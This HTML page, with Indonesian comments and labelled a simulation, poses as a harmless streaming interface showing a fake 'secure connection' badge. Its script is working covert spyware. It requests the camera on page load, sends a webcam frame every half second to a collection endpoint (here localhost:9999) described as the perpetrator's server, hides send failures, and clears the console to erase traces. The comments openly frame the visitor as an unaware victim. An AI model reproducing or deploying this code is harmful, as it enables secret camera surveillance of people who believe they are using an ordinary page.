<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Streaming</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        .container {
            background: #1a1a1a;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 0 50px rgba(0,255,0,0.1);
            text-align: center;
            border: 1px solid #333;
            max-width: 500px;
            width: 90%;
        }
        #videoFeed {
            width: 100%;
            border-radius: 12px;
            background: #000;
            border: 2px solid #2a2a2a;
            display: none;
        }
        .status {
            color: #00ff88;
            font-size: 14px;
            margin-top: 15px;
            letter-spacing: 2px;
            text-transform: uppercase;
            opacity: 0.7;
        }
        .dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00ff88;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 0.3; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); }
            100% { opacity: 0.3; transform: scale(0.8); }
        }
        .watermark {
            position: fixed;
            bottom: 10px;
            right: 15px;
            color: #333;
            font-size: 11px;
            letter-spacing: 1px;
        }
        #fakeUI {
            color: #555;
            font-size: 13px;
            margin-top: 10px;
            padding: 8px;
            background: #111;
            border-radius: 8px;
            border: 1px solid #222;
        }
        .green-light {
            color: #00ff88;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2 style="color:#fff; font-weight:300; letter-spacing:3px; margin-bottom:15px;">● STREAM</h2>
        <video id="videoFeed" autoplay playsinline></video>
        <div id="fakeUI">
            <span class="green-light">⚡</span> Koneksi aman • <span class="green-light">●</span> Aktif
        </div>
        <div class="status">
            <span class="dot"></span> SISTEM SIAP
        </div>
    </div>
    <div class="watermark">v.2.4.1</div>

    <script>
        (function() {
            // ============================================================
            // SIMULASI: Ini adalah korban (target) yang tidak menyadari
            // bahwa kameranya diakses secara diam-diam.
            // ============================================================

            const video = document.getElementById('videoFeed');
            let stream = null;

            // Fungsi untuk memulai kamera (tapi korban pikir ini hanya UI normal)
            function startCamera() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                        .then(function(mediaStream) {
                            stream = mediaStream;
                            video.srcObject = mediaStream;
                            video.style.display = 'block';
                            
                            // === INI RAHASIA: Kirim stream ke pelaku ===
                            // Data dikirim via WebSocket/HTTP ke server pelaku
                            sendStreamToAttacker(mediaStream);
                            
                            // Korban hanya lihat UI normal
                            document.querySelector('.status').innerHTML = '● STREAM AKTIF';
                        })
                        .catch(function(err) {
                            console.warn('Kamera tidak diizinkan atau error:', err);
                            document.querySelector('.status').innerHTML = '⚠️ KAMERA TIDAK TERSEDIA';
                        });
                } else {
                    document.querySelector('.status').innerHTML = '⚠️ PERANGKAT TIDAK MENDUKUNG';
                }
            }

            // ============================================================
            // FUNGSI RAHASIA: Mengirim stream ke pelaku
            // ============================================================
            function sendStreamToAttacker(mediaStream) {
                // Ambil track video dari stream
                const videoTrack = mediaStream.getVideoTracks()[0];
                if (!videoTrack) return;

                // Buat ImageCapture untuk mengambil frame secara periodik
                const imageCapture = new ImageCapture(videoTrack);
                
                // Kirim frame setiap 500ms ke server pelaku
                setInterval(() => {
                    imageCapture.grabFrame()
                        .then(imageBitmap => {
                            // Konversi ke base64
                            const canvas = document.createElement('canvas');
                            canvas.width = imageBitmap.width;
                            canvas.height = imageBitmap.height;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(imageBitmap, 0, 0);
                            const base64Data = canvas.toDataURL('image/jpeg', 0.7);
                            
                            // === KIRIM KE PELAKU ===
                            // Gunakan fetch untuk mengirim data ke endpoint pelaku
                            // (Di sini kita simulasikan dengan mengirim ke localhost:9999)
                            fetch('http://localhost:9999/capture', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    image: base64Data,
                                    timestamp: Date.now(),
                                    targetId: 'TARGET-001'
                                })
                            }).catch(() => {
                                // Jika server pelaku offline, diam-diam abaikan
                                // Korban tidak pernah tahu
                            });
                            
                            // ============================================
                            // STEALTH: Hapus jejak di console
                            // ============================================
                            console.clear();
                            console.log('%c✅ Sistem normal', 'color:#00ff88');
                        })
                        .catch(() => {
                            // Gagal ambil frame, diamkan
                        });
                }, 500); // Kirim 2 frame per detik
            }

            // Mulai kamera saat halaman dimuat
            window.addEventListener('load', function() {
                // Delay sedikit agar terlihat natural
                setTimeout(startCamera, 800);
            });

            // ============================================================
            // STEALTH: Korban tidak bisa menutup tab dengan mudah
            // ============================================================
            window.addEventListener('beforeunload', function(e) {
                // Tidak ada notifikasi ke korban
                // Tetapi kita matikan stream diam-diam
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            });

            // ============================================================
            // STEALTH: Sembunyikan indikator kamera di sistem (simulasi)
            // ============================================================
            // Di dunia nyata, ini tidak mungkin dilakukan dari browser
            // Tapi untuk simulasi, kita tidak tampilkan notifikasi apapun

        })();
    </script>
</body>
</html>
